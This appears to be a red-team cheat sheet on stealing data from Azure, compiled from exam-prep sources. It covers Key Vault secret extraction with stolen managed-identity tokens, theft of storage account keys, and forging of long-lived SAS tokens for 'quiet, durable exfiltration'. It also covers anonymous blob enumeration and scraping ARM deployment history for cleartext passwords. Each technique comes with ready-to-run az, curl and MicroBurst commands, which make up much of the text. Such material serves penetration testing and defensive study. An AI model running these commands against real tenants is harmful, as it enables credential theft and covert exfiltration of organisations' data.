# Cloud - Azure data-plane theft: Key Vault, Storage, ARM history

## Key Vault secret extraction via az and stolen managed-identity token

**Trigger:** You hold a vault.azure.net token (from a managed identity or az) or have Key Vault RBAC / access-policy rights on a vault.

Key Vault holds the crown jewels: service-principal secrets, database connection strings, and certificates. With az data-plane access, list then dereference: az keyvault secret list --vault-name <v>, then az keyvault secret show --vault-name <v> -n <secret> --query value -o tsv. From a stolen managed-identity token skip az and hit REST directly: mint a vault.azure.net token from IMDS, then curl -H 'Authorization: Bearer $T' 'https://<vault>.vault.azure.net/secrets?api-version=7.4' and follow each secret id. Check az keyvault show -n <v> --query properties.enableRbacAuthorization to know whether the vault is governed by RBAC roles (Key Vault Secrets User / Administrator) or legacy access policies, and whether public network access is enabled. MicroBurst's Get-AzPasswords automates bulk extraction across Key Vaults, Automation credentials, storage keys, and app settings in one sweep.

```powershell
az keyvault secret list --vault-name <vault> -o table
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv
curl -s -H "Authorization: Bearer $TOKEN" "https://<vault>.vault.azure.net/secrets?api-version=7.4" | jq .
Get-AzPasswords   # MicroBurst
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock

## Storage account key theft, SAS forging, and anonymous blob enumeration

**Trigger:** You enumerate Azure Storage accounts, hold Contributor (which can listKeys), or want to test public blob exposure with no credentials.

A storage account key is a full, non-expiring credential to all blobs, files, tables, and queues. Contributor and above can read them: az storage account keys list -g <rg> -n <acct>. With a key you can mint a broad or scoped SAS token for quiet, durable exfiltration that survives key-holder review: az storage container generate-sas --account-name <acct> -n <container> --permissions rlacw --expiry 2099-01-01 --account-key <key>. Test anonymous exposure with no credentials at all by listing a container over REST: a 200 with an XML enumeration means the container is public. Prefer Entra-auth enumeration (--auth-mode login) when you hold RBAC so you avoid touching keys. MicroBurst's Invoke-EnumerateAzureBlobs brute-forces public container and blob names from a wordlist against a base name.

```powershell
az storage account keys list -g <rg> -n <acct> -o table
az storage container generate-sas --account-name <acct> -n <container> --permissions rlacw --expiry 2099-01-01 --account-key <key>
curl -s "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list"
Invoke-EnumerateAzureBlobs -Base <name>   # MicroBurst
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock

## ARM deployment-history credential extraction

**Trigger:** You have Reader or better over a resource group/subscription and are hunting for cleartext secrets left behind by past deployments.

ARM retains the full parameter payload of every past deployment, and templates routinely pass VM local-admin passwords, connection strings, and API keys as plaintext parameters, so deployment history is a quiet credential store readable with only Reader. Enumerate deployments per resource group and dump each deployment's parameters/outputs; secretString and password parameters are frequently present in the clear even when the running resource has since rotated. This is the Azure analogue of scraping cloud-init/user-data and needs no write access.

```powershell
az deployment group list -g <RG> -o table
az deployment group show -g <RG> -n <deploymentName> --query properties.parameters
Get-AzResourceGroupDeployment -ResourceGroupName <RG> | ForEach-Object { $_.Parameters }
```

Source: https://offsecexams.com/cheatsheets/cartp-exam---guided-by-redblock
